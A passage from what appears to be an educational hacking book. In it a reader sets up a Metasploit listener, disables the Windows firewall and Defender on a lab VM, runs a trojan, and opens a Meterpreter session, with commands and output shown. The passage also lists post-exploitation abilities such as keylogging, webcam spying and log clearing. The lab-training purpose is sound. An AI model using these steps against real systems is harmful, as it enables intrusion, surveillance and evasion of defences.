- raw: "3.  Enter your Kali VM’s IP address to indicate the local host where connections\
    \ will be coming in (remember to fill in the last number):\n\n    ```\n    msf6\
    \ exploit(multi/handler) > set LHOST 10.0.9.x\n    ```\n\n    Metasploit will\
    \ respond with `LHOST => ``10.0.9.x` to indicate that the local host option is\
    \ set correctly.\n\n4.  Finally, the moment we’ve been waiting for: launch the\
    \ exploit!\n\n    ```\n    msf6 exploit(multi/handler) > exploit -j \n    ```\n\
    \n    The `-j` option tells Metasploit to run the handler in the background so\
    \ you can use the msfconsole while you wait for infected machines to connect to\
    \ your Kali VM. Metasploit will confirm that the exploit is running in the background,\
    \ ready to accept incoming connections on `10.0.9.``x``:4444`, or port 4444 on\
    \ your Kali VM.\n\n## Infecting Your Windows VM\n\nOur trojan is primed and ready\
    \ to go. Now it’s time to infect your Windows VM. First, we’ll disable a couple\
    \ of Windows security features that would normally make it harder for users to\
    \ do something stupid like download and open a questionable file from the internet.\
    \ Then, with those safeguards turned off, that something stupid is exactly what\
    \ we’ll do.\n\nRemember, your Windows VM was created for you to practice hacking\
    \ safely. If you mess it up, such as by infecting it with a trojan, you can simply\
    \ delete the Windows VM and create a new one. With that in mind, start your Windows\
    \ 10 VM in VirtualBox, entering the username `IEUser` and password `Passw0rd!`\
    \ if prompted, and let’s get going.\n\n1.  Enter `cmd` in the Windows/Cortana\
    \ search bar to find the command prompt. Right-click it and select **Run as administrator**.\
    \ In the pop-up window asking if you want to allow this app to make changes to\
    \ your device, click **Yes**.\n\n2.  In the Administrator: Command Prompt window\
    \ that appears, enter this command to turn off your Windows VM’s firewall:\n\n\
    \    ```\n    C:\\Windows\\system32> netsh advfirewall set allprofiles state off\n\
    \    ```\n\n    Normally, a *firewall* would block unwanted or malicious traffic\
    \ from outside computers, and it can keep your computer from making suspicious\
    \ connections to malicious servers. After running this command, you might see\
    \ the pop-up message “Turn on Windows Firewall.” Windows is warning you that it’s\
    \ dangerous to leave your firewall turned off—and it is!—but that’s what we want\
    \ for this first remote hack.\n\n3.  Next, we’ll turn off Windows Defender, another\
    \ safety tool. Enter `virus` in the search bar and open the **Virus & threat protection**\
    \ settings.\n\n4.  Click **Manage settings** and slide the toggle buttons for\
    \ Real-time protection and Cloud-delivered protection to **Off**. Windows will\
    \ ask again if you want to allow this app to make changes to your device. Click\
    \ **Yes**. Your Windows 10 VM is now as vulnerable as one-fourth of all PCs on\
    \ the planet. \n\n5.  Open the Edge web browser and go to *http://<10.0.9.x>/share/*.\n\
    \n6.  Click your trojan and choose **Save** to download the file to your Windows\
    \ VM’s *Downloads* folder.\n\n7.  The moment of truth: open the Windows VM’s *Downloads*\
    \ folder and double-click the trojan executable file to run it.\n\n8.  It turns\
    \ out that Windows 10 PCs have one more layer of virus protection to prevent boneheaded\
    \ mistakes like the one we just made: Windows Defender SmartScreen will pop up\
    \ a warning that it “prevented an unrecognized app from starting,” as shown in\
    \ [Figure 6-4](#c06.xhtml#figure6-4). Click **More info** and then **Run anyway**.\n\
    \nYou’ve now taken control of your first computer! You won’t see anything happen\
    \ on the Windows VM, but if you switch back to the Kali VM, you should see something\
    \ like the following in msfconsole:\n\n```\n[*] Sending stage (179779 bytes) to\
    \ 10.0.9.5\n[*] Meterpreter session 1 opened (10.0.9.4:4444 -> 10.0.9.5:49830)\
    \ at 2021-06-11 12:39:46 -0400\n```\n\nThe infected Windows VM called back to\
    \ Kali and established a connection (also called a *session*). Congratulations:\
    \ the Windows VM is now awaiting your commands!\n\n![Figure 6-4: Windows Defender\
    \ SmartScreen tries to protect your Windows VM one last time.](image_fi/502000c06/f06004a.png)\n\
    \nFigure 6-4: Windows Defender SmartScreen tries to protect your Windows VM one\
    \ last time.\n\n## Controlling Your Windows VM with Meterpreter\n\nNow that we’ve\
    \ established a connection between your Kali and Windows VMs, we’re ready to start\
    \ manipulating the Windows machine from Metasploit. To begin, enter `sessions`\
    \ in the Metasploit terminal window to see the list of active Metasploit connections:\n\
    \n```\nmsf6 exploit(multi/handler) > sessions\nActive sessions\n===============\
    \ Id  Name  Type                     Information                       Connection\
    \ --  ----  ----                     -----------                       ----------\
    \ 1         meterpreter x86/windows  MSEDGEWIN10\\IEUser @ MSEDGEWIN10  10.0.9.4:4444\
    \ -> 10.0.9.5:63750 (10.0.9.5)\n```\n\nAs you can see, we’re connected to an infected\
    \ Windows 10 machine named MSEdgeWin10 under a username *IEUser*—that’s your Windows\
    \ 10 VM! Our session has an ID number of 1. If you ran the trojan on other machines\
    \ as well, you’d see multiple sessions listed, each with its own ID number. Similarly,\
    \ if you have to reestablish the connection with the Windows VM, it’ll be listed\
    \ with a different ID number, such as 2.\n\nEnter `sessions -i ``1` to start interacting\
    \ with the Windows VM:\n\n```\nmsf6 exploit(multi/handler) > sessions -i 1\n[*]\
    \ Starting interaction with 1...\nmeterpreter >\n```\n\nThe command prompt changes\
    \ to `meterpreter` `>` to indicate that we’re interacting with the Meterpreter\
    \ shell on the remote Windows VM. Let’s try a few commands. Enter `sysinfo` to\
    \ view some information about the computer, such as its operating system (OS),\
    \ the system language, and more:\n\n```\nmeterpreter > sysinfo\nComputer     \
    \   : MSEDGEWIN10\nOS              : Windows 10 (Build 17763).--snip--\n```\n\n\
    Now let’s try another command, `pwd`, short for *print working directory*, to\
    \ see where the Meterpreter shell is running from:\n\n```\nmeterpreter > pwd\n\
    C:\\Users\\IEUser\\Downloads\n```\n\nThis tells us that the Meterpreter shell\
    \ is running from the Windows VM’s *Downloads* directory—where our trojan is located.\n\
    \nEnter `help` to list some of the most common commands you can run on your Windows\
    \ VM remotely from the Meterpreter shell. There are commands to run programs,\
    \ terminate running processes, shut down or reboot the remote computer, clear\
    \ event logs (to cover your tracks while hacking), capture keystrokes, take screenshots,\
    \ and spy on the remote user’s desktop or webcam, just to name a few. In total,\
    \ there are over 100 commands an attacker could use to take almost complete control\
    \ of a computer. A partial listing of these commands is shown in [Figure 6-5](#c06.xhtml#figure6-5).\n\
    \nTo find out how serious the threat really is, let’s see how easily an attacker\
    \ could hack our files, keyboard, webcam, and more through an infected file. Not\
    \ every command we’ll use will work every time you try it; you may have to make\
    \ multiple attempts. However, exploring the damage these commands can do should\
    \ motivate you *never* to install software from a random web page or email attachment.\n\
    \n![Figure 6-5: A selection of frighteningly cool Meterpreter commands we can\
    \ use to control the infected Windows VM](image_fi/502000c06/f06005a.png)\n\n\
    Figure 6-5: A selection of frighteningly cool Meterpreter commands we can use\
    \ to control the infected Windows VM\n\n### Viewing and Uploading Files\n\nWe’ll\
    \ start our exploitation of the Windows VM by browsing the computer’s files and\
    \ uploading a backup copy of our trojan to the Windows VM.\n\n1.  At the `meterpreter\
    \ >` command prompt, enter these commands to change the directory to the infected\
    \ VM’s *Documents* folder and list the folder’s contents:"
